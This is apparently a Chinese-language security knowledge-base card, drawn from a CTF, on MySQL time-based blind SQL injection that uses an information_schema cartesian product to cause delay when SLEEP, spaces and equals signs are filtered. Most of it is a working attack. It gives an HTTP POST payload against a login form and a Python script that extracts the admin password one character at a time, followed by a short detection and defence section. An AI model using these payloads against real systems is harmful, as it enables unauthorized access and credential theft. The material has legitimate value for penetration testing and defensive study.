---
id: web-generic-sqli-cartesian-product-time-blind
title: 笛卡尔积时间盲注：SLEEP、空格与等号被过滤时逐字符提取
type: scenario
domain: web
path: web/generic/sqli
technique: cartesian-product-time-blind-sqli
tags:
- sqli
- blind
- time-based
- mysql
- waf-bypass
- cartesian-product
- login-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V20
  verified_at: '2026-11-05T02:12:23+08:00'
  notes: 已通读原文并核对8张图：登录点过滤 SLEEP/空格/等号，卡内 UNION+IF+笛卡尔积、/**/ 与 LIKE 前缀替代及 Python 脚本与原文一致；图02 登录框、图05 admin 登录后文件列表佐证数据提取结果。卡内补充 LIKE 通配符需排除 _ 属合理修正。CTF 环境，无产品版本/CVE；frontmatter 无 sources/source_url；PoC 未在本机复跑。
url: /docs/web/generic/sqli/web-generic-sqli-cartesian-product-time-blind/
draft: false
kb_aliases:
- 笛卡尔积注入
- 笛卡尔积延时注入
- information_schema 交叉连接盲注
- SLEEP 被过滤的时间盲注
- 大表交叉连接时延
---

## 一句话结论

当 MySQL 注入点过滤了 `SLEEP()`、空格和 `=`，可把 `information_schema.columns` 做三表交叉连接（笛卡尔积）作为耗时操作，用 `IF(条件, 大笛卡尔积, 1)` 构造时间 oracle，再用 `LIKE '前缀%'` 替代等号、`/**/` 替代空格，逐字符提取登录口令等数据。

## 原理

- MySQL 执行 `FROM A, B, C` 时会先构造三表的笛卡尔积再聚合。`information_schema.columns` 本身行数很多，三表交叉后中间结果达到数百万甚至更多行，`count(*)` 需要可观测的时间；数据量越大、服务器越慢，延迟越明显。
- 把耗时查询放进 `IF(expr1, expr2, expr3)`：条件为真时执行笛卡尔积（慢），为假时返回常数 `1`（快）。响应时间差即布尔 oracle，无需 `SLEEP()`。
- 常见过滤的替代：
  - 空格被过滤：用 MySQL 注释 `/**/` 充当词法分隔；
  - `=` 被过滤：用 `LIKE` 做前缀匹配，`password LIKE 't%'` 等价于“密码以 t 开头”；
  - `SLEEP` 被过滤：用大表笛卡尔积产生延迟；
  - `#` 注释截断原查询剩余部分。
- 逐字符提取时，把已知前缀与候选字符合并成 `LIKE '已知前缀+候选%'`。字符集里必须排除 `%` 和 `_`，否则它们会被当作通配符导致误判。

## 触发条件

- 存在可注入的 MySQL 查询（本例为登录框密码参数），且 `UNION` 可用、原查询列数与 payload 匹配；
- `SLEEP`、空格、`=` 等被黑名单过滤，但 `IF`、`LIKE`、`information_schema` 未被过滤；
- 数据库账号可读 `information_schema.columns`（MySQL 默认允许）；
- 响应时间可观测，且笛卡尔积耗时明显高于网络抖动（需先测基线并校准表数量/条件）。

## 利用步骤

1. 确认注入与过滤情况：分别测试 `'`、空格、`=`、`SLEEP`、`UNION` 是否被拦截。
2. 用 `SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C` 测一次延迟，确认耗时可控（必要时再交叉一张表）。
3. 构造 `UNION SELECT IF((子查询) LIKE '前缀%', 笛卡尔积, 1)#`，观察响应是否超时。
4. 遍历候选字符，每次把“已知前缀+候选”送入 `LIKE`，命中则延迟、未命中则快速返回。
5. 拼接出完整口令/字段值后登录或继续提取其它数据。

## PoC

```http
POST /login.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=admin&password=1'union/**/select/**/if((select/**/password/**/from/**/users/**/where/**/username/**/like/**/'admin')/**/like/**/'t%',(SELECT/**/count(*)/**/FROM/**/information_schema.columns/**/A,/**/information_schema.columns/**/B,/**/information_schema.columns/**/C),1)#
```

```python
import requests, string

url = "http://target/login.php"
chars = string.printable.replace("%", "").replace("_", "")   # 排除 LIKE 通配符
known = ""

while True:
    for ch in chars:
        payload = {
            "username": "admin",
            "password": (
                "1'union/**/select/**/if((select/**/password/**/from/**/users/**/"
                "where/**/username/**/like/**/'admin')/**/like/**/'"
                + known + ch + "%',"
                "(SELECT/**/count(*)/**/FROM/**/information_schema.columns/**/A,"
                "/**/information_schema.columns/**/B,/**/information_schema.columns/**/C),1)#"
            ),
        }
        try:
            requests.post(url, data=payload, timeout=5)
        except requests.exceptions.Timeout:
            known += ch
            print("current:", known)
            break
```

```text
# 实测口令示例：this_is_a_strong_password
# 说明：命中时笛卡尔积耗时超过 timeout，requests 抛 Timeout；未命中时快速返回。
```

## 变体与关联

- 变体：表数量可按目标性能增减；也可用 `BENCHMARK()`、`GET_LOCK()`、正则回溯等替代笛卡尔积，见关联卡片。
- 变体：若 `LIKE` 也被过滤，可用 `REGEXP`、`IN`、`BETWEEN`、`STRCMP` 或函数拼接重建比较。
- 关联：[[web-generic-sqli-blind-filter-bypass-functions]]（IF/SLEEP/AND/OR 被过滤时的替代原语总览）。
- 边界：笛卡尔积延迟受服务器负载、缓存、行数影响，稳定性不如 `SLEEP`；字符集包含 `%`/`_` 会造成误报；大小写不敏感排序规则下需加 `BINARY` 才能区分大小写。

## 检测与防御

- 检测：同一登录接口被高频请求且响应时间呈阶梯式差异；请求体包含 `information_schema.columns`、多表逗号交叉、`/**/`、`IF(`、`LIKE '...%'` 等组合；短时间大量登录失败。
- 修复：使用参数化查询/预编译语句，禁止拼接 SQL；对登录错误统一返回，不暴露数据库差异。
- 加固：WAF 拦截 `information_schema` 与异常多表交叉；数据库账号最小权限，限制 `information_schema` 读取；设置请求超时与频率限制，降低时间侧信道可用性。
